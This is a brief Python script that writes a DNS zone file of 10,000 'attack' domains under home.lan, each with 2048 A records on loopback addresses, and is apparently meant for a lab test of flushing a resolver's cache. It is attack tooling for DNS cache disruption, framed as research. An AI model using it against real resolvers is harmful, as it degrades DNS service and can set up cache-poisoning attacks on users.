
# Script to generate a large number of A records (2048 per attack domain) - for cache flush.
with open('ACacheFlush_zone_file.txt', 'w') as f:
    DOMAINS_NUM = 10000  # Number of attack domains
    
    for i in range(DOMAINS_NUM): 
        for ip_octet1 in range(8): # Generate 8*256 A records per domain
            for ip_octet2 in range(256):  
                print(f'attack{i}.home.lan. 3600 IN A 127.0.{ip_octet1}.{ip_octet2}', file=f)

